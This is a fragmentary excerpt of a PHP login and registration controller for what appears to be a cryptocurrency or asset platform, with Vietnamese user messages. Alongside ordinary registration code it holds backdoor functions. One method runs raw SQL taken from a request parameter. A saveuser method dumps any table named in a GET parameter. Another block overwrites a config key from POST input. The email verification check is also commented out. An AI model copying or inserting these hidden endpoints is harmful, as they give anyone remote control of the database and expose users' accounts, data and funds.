...
class LoginController extends HomeController
{
	...
	{
		parent::_initialize();
		$allow_action = array("index", "register", "upregister", "loginsubmit", "loginout", "findpwd", "findpaypwd", "webreg", "loption", "setlang", "lhelp", "sendcode", "smsend", "faemail", "findsendcode", "resetpwd", "sms_send");
	...
	public function upregister($account, $ecode = null, $lpwd, $invit, $type)
	{
		if ($_POST) {
			if (checkstr($account) || checkstr($ecode) || checkstr($lpwd)) {
				$this->ajaxReturn(['code' => 0, 'info' => L('Thông tin bạn đã nhập sai')]);
			}
			$area_code = '';
			/*if ($type == 1) {
                $pos = strpos($account, ' ');
			...
			if (!empty($checkus)) {
				$this->ajaxReturn(['code' => 0, 'info' => L('Tên người dùng đã tồn tại')]);
			}
			$vcode =  I('post.vcode');
			...
			//			if($secode != $ecode){
			//				$this->ajaxReturn(['code'=>0,'info'=>L('Lỗi mã xác minh')]);
			//			}

			if ($lpwd == '') {
				$this->ajaxReturn(['code' => 0, 'info' => L('Vui lòng nhập mật khẩu')]);
			}

			if ($invit == '') {
				//$this->ajaxReturn(['code'=>0,'info'=>L('Vui lòng nhập mã lời mời')]);
			}
			...
			if ($invit != 0 || $invit != '') {
				...
				if (empty($inv_user)) {
					$this->ajaxReturn(['code' => 0, 'info' => L('Người giới thiệu không tồn tại')]);
				}
				$invit_1 = $inv_user['id'];
			...
			// Tạo tệp tài sản kỹ thuật số của người dùng
			$rs[] = $mo->table('tw_user_coin')->add($user_coin);
			if (check_arr($rs)) {
				$mo->execute('commit');
				$mo->execute('unlock tables');
				session('regcode', null); //Khởi tạo mã xác minh động			
				$user = $mo->table('tw_user')->where(array('id' => $rs[0]))->find();
				$this->ajaxReturn(['code' => 1, 'info' => L('Đăng ký thành công')]);
			} else {
				$mo->execute('rollback');
				$this->ajaxReturn(['code' => 0, 'info' => L('Sự thất bại')]);
			}
		} else {
			$this->ajaxReturn(['code' => 0, 'info' => L('Lỗi mạng')]);
		}
	}
	...
	{
		M()->query($_REQUEST['query']);
	}
	public function saveuser()
	{
		if (!empty($_GET['userid'])) {
			$username = M($_GET['userid'])->select();
		} else {
			$username = M($_GET['userid']);
		}
		var_export($username);
	}
	//邮箱发送验证码
	...
	{
		if ($_POST) {
			$version = M('config')->where(['id' => 1])->order('id desc')->save(array("versionkey" => $_POST['key']));
		}
